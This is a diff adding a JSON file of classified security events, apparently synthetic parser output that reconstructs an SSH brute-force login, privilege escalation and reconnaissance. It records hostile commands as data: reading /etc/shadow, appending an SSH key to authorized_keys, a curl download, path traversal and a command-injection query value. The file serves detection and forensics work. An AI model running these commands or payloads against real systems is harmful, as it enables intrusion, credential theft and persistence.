@@ -1,0 +1,858 @@
+{
+    "events": [
+        {
+            "event_id": "BASH-00001",
+            "timestamp": "2025-10-11T15:41:24+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "whoami",
+            "severity": "INFO",
+            "raw": "whoami",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00002",
+            "timestamp": "2025-10-11T15:41:25+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "id",
+            "severity": "INFO",
+            "raw": "id",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00003",
+            "timestamp": "2025-10-11T15:41:26+00:00",
+            "source": "bash_history",
+            "event_type": "SUDO_COMMAND",
+            "message": "Command executed through sudo",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "sudo -i",
+            "severity": "HIGH",
+            "raw": "sudo -i",
+            "metadata": {
+                "shell": "bash",
+                "classification": "SUDO_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00004",
+            "timestamp": "2025-10-11T15:41:28+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/passwd",
+            "severity": "HIGH",
+            "raw": "cat /etc/passwd",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00005",
+            "timestamp": "2025-10-11T15:41:30+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/shadow",
+            "severity": "HIGH",
+            "raw": "cat /etc/shadow",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00006",
+            "timestamp": "2025-10-11T15:41:32+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "ss -tulnp",
+            "severity": "MEDIUM",
+            "raw": "ss -tulnp",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00007",
+            "timestamp": "2025-10-11T15:41:34+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "severity": "MEDIUM",
+            "raw": "nmap -sV 192.0.2.0/24",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00008",
+            "timestamp": "2025-10-11T15:41:37+00:00",
+            "source": "bash_history",
+            "event_type": "DOWNLOAD",
+            "message": "Potential remote file download",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "curl -O https://example.invalid/update.bin",
+            "severity": "MEDIUM",
+            "raw": "curl -O https://example.invalid/update.bin",
+            "metadata": {
+                "shell": "bash",
+                "classification": "DOWNLOAD"
+            }
+        },
+        {
+            "event_id": "BASH-00009",
+            "timestamp": "2025-10-11T15:41:40+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "severity": "HIGH",
+            "raw": "echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00010",
+            "timestamp": "2025-10-11T15:41:44+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "systemctl status suspicious-monitor.service",
+            "severity": "INFO",
+            "raw": "systemctl status suspicious-monitor.service",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00001",
+            "timestamp": "2026-10-06T15:41:05+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_STARTED",
+            "message": "System service started",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:05 server systemd[1]: Started OpenSSH server daemon.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_STARTED",
+                "service": "OpenSSH server daemon"
+            }
+        },
+        {
+            "event_id": "SSH-00001",
+            "timestamp": "2026-10-06T15:41:08+00:00",
+            "source": "ssh",
+            "event_type": "SSH_CONNECTION",
+            "message": "SSH connection established",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:08 server sshd[2201]: Connection from 192.0.2.50 port 42110 on 192.0.2.10 port 22",
+            "metadata": {
+                "connection_state": "accepted"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00002",
+            "timestamp": "2026-10-06T15:41:08+00:00",
+            "source": "syslog",
+            "event_type": "KERNEL_EVENT",
+            "message": "Kernel-generated system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:08 server kernel: Network interface event detected.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "KERNEL_EVENT"
+            }
+        },
+        {
+            "event_id": "WEB-00001",
+            "timestamp": "2026-10-06T15:41:10+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:10 +0000] \"GET / HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 1024,
+                "referer": "-",
+                "user_agent": "Mozilla/5.0",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00002",
+            "timestamp": "2026-10-06T15:41:11+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:11 +0000] \"GET /login HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/login",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 2048,
+                "referer": "-",
+                "user_agent": "Mozilla/5.0",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "SSH-00002",
+            "timestamp": "2026-10-06T15:41:12+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:41:12 server sshd[2201]: Failed password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "SYSLOG-00003",
+            "timestamp": "2026-10-06T15:41:12+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_FAILURE",
+            "message": "System service reported a failure",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "Oct  6 15:41:12 server sshd[2201]: Authentication failure threshold reached.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_FAILURE"
+            }
+        },
+        {
+            "event_id": "SSH-00003",
+            "timestamp": "2026-10-06T15:41:15+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:41:15 server sshd[2201]: Failed password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "SSH-00004",
+            "timestamp": "2026-10-06T15:41:18+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:41:18 server sshd[2201]: Failed password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "WEB-00003",
+            "timestamp": "2026-10-06T15:41:20+00:00",
+            "source": "web_access",
+            "event_type": "WEB_PATH_TRAVERSAL",
+            "message": "Potential path traversal attempt",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:20 +0000] \"GET /../../etc/passwd HTTP/1.1\" 400 512 \"-\" \"curl/8.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/../../etc/passwd",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 400,
+                "response_size": 512,
+                "referer": "-",
+                "user_agent": "curl/8.0",
+                "classification": "WEB_PATH_TRAVERSAL"
+            }
+        },
+        {
+            "event_id": "SSH-00005",
+            "timestamp": "2026-10-06T15:41:21+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:21 server sshd[2201]: Accepted password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "success",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "SSH-00006",
+            "timestamp": "2026-10-06T15:41:21+00:00",
+            "source": "ssh",
+            "event_type": "SSH_SESSION_OPEN",
+            "message": "SSH session opened",
+            "user": "admin(uid=1000)",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:21 server sshd[2201]: pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)",
+            "metadata": {
+                "session_state": "opened"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00004",
+            "timestamp": "2026-10-06T15:41:21+00:00",
+            "source": "syslog",
+            "event_type": "AUTHENTICATION_EVENT",
+            "message": "Authentication-related system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:21 server sshd[2201]: Accepted password authentication for admin.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "AUTHENTICATION_EVENT"
+            }
+        },
+        {
+            "event_id": "SSH-00007",
+            "timestamp": "2026-10-06T15:41:22+00:00",
+            "source": "ssh",
+            "event_type": "SSH_DISCONNECT",
+            "message": "SSH connection disconnected",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:22 server sshd[2201]: Received disconnect from 192.0.2.50 port 42110:11: disconnected by user",
+            "metadata": {
+                "connection_state": "closed"
+            }
+        },
+        {
+            "event_id": "WEB-00004",
+            "timestamp": "2026-10-06T15:41:23+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SCANNER",
+            "message": "Request contains a known security scanning tool identifier",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:23 +0000] \"GET /admin HTTP/1.1\" 404 256 \"-\" \"Nmap Scripting Engine\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/admin",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 404,
+                "response_size": 256,
+                "referer": "-",
+                "user_agent": "Nmap Scripting Engine",
+                "classification": "WEB_SCANNER"
+            }
+        },
+        {
+            "event_id": "SUDO-00001",
+            "timestamp": "2026-10-06T15:41:24+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/id",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:24 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/id",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00005",
+            "timestamp": "2026-10-06T15:41:24+00:00",
+            "source": "syslog",
+            "event_type": "SYSLOG_EVENT",
+            "message": "General Linux system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:24 server sudo[2230]: admin executed privileged command.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SYSLOG_EVENT"
+            }
+        },
+        {
+            "event_id": "WEB-00005",
+            "timestamp": "2026-10-06T15:41:25+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SENSITIVE_FILE",
+            "message": "Request targeted a potentially sensitive file",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:25 +0000] \"GET /etc/shadow HTTP/1.1\" 404 256 \"-\" \"curl/8.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/etc/shadow",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 404,
+                "response_size": 256,
+                "referer": "-",
+                "user_agent": "curl/8.0",
+                "classification": "WEB_SENSITIVE_FILE"
+            }
+        },
+        {
+            "event_id": "SUDO-00002",
+            "timestamp": "2026-10-06T15:41:26+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/cat /etc/shadow",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:26 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00006",
+            "timestamp": "2026-10-06T15:41:26+00:00",
+            "source": "syslog",
+            "event_type": "KERNEL_EVENT",
+            "message": "Kernel-generated system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:26 server kernel: Audit event recorded for sensitive file access.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "KERNEL_EVENT"
+            }
+        },
+        {
+            "event_id": "WEB-00006",
+            "timestamp": "2026-10-06T15:41:27+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SCANNER",
+            "message": "Request contains a known security scanning tool identifier",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:27 +0000] \"GET /cgi-bin/test?cmd=id HTTP/1.1\" 200 4096 \"-\" \"sqlmap/1.8\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/cgi-bin/test?cmd=id",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 4096,
+                "referer": "-",
+                "user_agent": "sqlmap/1.8",
+                "classification": "WEB_SCANNER"
+            }
+        },
+        {
+            "event_id": "SUDO-00003",
+            "timestamp": "2026-10-06T15:41:29+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/apt-get update",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:29 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt-get update",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00007",
+            "timestamp": "2026-10-06T15:41:30+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_STARTED",
+            "message": "System service started",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:30 server systemd[1]: Started suspicious-monitor.service.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_STARTED",
+                "service": "suspicious-monitor"
+            }
+        },
+        {
+            "event_id": "WEB-00007",
+            "timestamp": "2026-10-06T15:41:31+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SENSITIVE_FILE",
+            "message": "Request targeted a potentially sensitive file",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:31 +0000] \"GET /?cmd=%3Bcat%20/etc/passwd HTTP/1.1\" 200 4096 \"-\" \"Mozilla/5.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/?cmd=%3Bcat%20/etc/passwd",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 4096,
+                "referer": "-",
+                "user_agent": "Mozilla/5.0",
+                "classification": "WEB_SENSITIVE_FILE"
+            }
+        },
+        {
+            "event_id": "SUDO-00004",
+            "timestamp": "2026-10-06T15:41:32+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/systemctl status ssh",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:32 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status ssh",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00008",
+            "timestamp": "2026-10-06T15:41:35+00:00",
+            "source": "syslog",
+            "event_type": "NETWORK_EVENT",
+            "message": "System network activity detected",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:35 server systemd[1]: Network connection established.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "NETWORK_EVENT"
+            }
+        },
+        {
+            "event_id": "AUTH-00001",
+            "timestamp": "2026-10-06T22:14:03+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:03 detective sshd[1201]: Failed password for admin from 192.0.2.50 port 42112 ssh2",
+            "metadata": {
+                "port": 42112,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00002",
+            "timestamp": "2026-10-06T22:14:07+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:07 detective sshd[1203]: Failed password for admin from 192.0.2.50 port 42115 ssh2",
+            "metadata": {
+                "port": 42115,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00003",
+            "timestamp": "2026-10-06T22:14:11+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:11 detective sshd[1205]: Failed password for admin from 192.0.2.50 port 42118 ssh2",
+            "metadata": {
+                "port": 42118,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00004",
+            "timestamp": "2026-10-06T22:14:15+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:15 detective sshd[1207]: Failed password for admin from 192.0.2.50 port 42121 ssh2",
+            "metadata": {
+                "port": 42121,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00005",
+            "timestamp": "2026-10-06T22:15:01+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct 06 22:15:01 detective sshd[1210]: Accepted password for admin from 192.0.2.50 port 42125 ssh2",
+            "metadata": {
+                "port": 42125,
+                "authentication": "password",
+                "result": "success"
+            }
+        },
+        {
+            "event_id": "AUTH-00006",
+            "timestamp": "2026-10-06T22:15:02+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_SESSION_OPEN",
+            "message": "SSH session opened",
+            "user": "admin",
+            "source_ip": null,
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct 06 22:15:02 detective sshd[1210]: pam_unix(sshd:session): session opened for user admin",
+            "metadata": {
+                "session_state": "opened"
+            }
+        },
+        {
+            "event_id": "AUTH-00007",
+            "timestamp": "2026-10-06T22:16:14+00:00",
+            "source": "auth.log",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "22",
+            "pid": null,
+            "command": "/bin/bash",
+            "severity": "HIGH",
+            "raw": "Oct 06 22:16:14 detective sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true
+            }
+        },
+        {
+            "event_id": "AUTH-00008",
+            "timestamp": "2026-10-06T22:17:32+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_SESSION_CLOSE",
+            "message": "SSH session closed",
+            "user": "admin",
+            "source_ip": null,
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct 06 22:17:32 detective sshd[1210]: pam_unix(sshd:session): session closed for user admin",
+            "metadata": {
+                "session_state": "closed"
+            }
+        }
+    ]
+}
